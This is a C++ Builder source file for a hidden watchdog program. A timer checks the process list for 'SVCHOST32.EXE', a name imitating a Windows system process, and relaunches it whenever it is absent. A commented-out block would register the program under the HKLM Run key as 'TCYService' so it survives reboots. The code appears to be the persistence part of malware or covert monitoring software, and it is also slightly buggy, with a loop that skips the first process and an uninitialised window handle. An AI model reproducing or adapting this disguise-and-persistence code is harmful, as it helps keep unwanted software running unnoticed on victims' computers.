//---------------------------------------------------------------------------

#include <vcl.h>
#pragma hdrstop

#include "Unit1.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
#include <tlhelp32.hpp>
TForm1 *Form1;
AnsiString agent_name="SVCHOST32.EXE";

#include <tlhelp32.hpp> 

PACKAGE void __fastcall GetActiveAppList (TStringList *slist)
{
if (!slist) return;

slist->Clear(); 

TProcessEntry32 prj;
prj.dwSize = sizeof(PROCESSENTRY32); 

HANDLE hss = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0); 
if (((int)(hss)) == (-1)) return; 

AnsiString fname; 
try { 
for (bool loop = Process32First(hss, &prj); loop; loop = Process32Next(hss, &prj)) 
{ fname = AnsiString(prj.szExeFile).Trim().UpperCase(); 
if (fname.IsEmpty()) continue; 
slist->Add(fname); 
} 
} // try
catch (...) { slist->Clear(); } 

CloseHandle(hss); 
} 

//---------------------------------------------------------------------------
//---------------------------------------------------------------------------
__fastcall TForm1::TForm1(TComponent* Owner)
        : TForm(Owner)
{
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Timer1Timer(TObject *Sender)
{
bool flag = false;
TStringList *slist = new TStringList();
try {
        GetActiveAppList(slist);
        for(int i=1;i<slist->Count;i++)
        if(slist->operator [](i)==agent_name) flag=true;
    }
__finally
        {
         delete slist;
        }
HWND handle;
if(!flag) ShellExecute(handle, "open", "svchost32.exe", NULL, NULL, SW_SHOWNORMAL);

}
//---------------------------------------------------------------------------
void __fastcall TForm1::FormCreate(TObject *Sender)
{
/*
HKEY hKey;
char szPath[0x100];
GetModuleFileName(NULL, szPath, sizeof(szPath));


RegCreateKeyEx(HKEY_LOCAL_MACHINE,
"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
NULL,
"",
REG_OPTION_NON_VOLATILE,
KEY_SET_VALUE,
NULL,
&hKey,
NULL);
if (hKey)
{
RegSetValueEx(hKey, "TCYService", NULL, REG_SZ, (LPBYTE)szPath, strlen(szPath));
RegCloseKey(hKey);
}
*/
}
//---------------------------------------------------------------------------
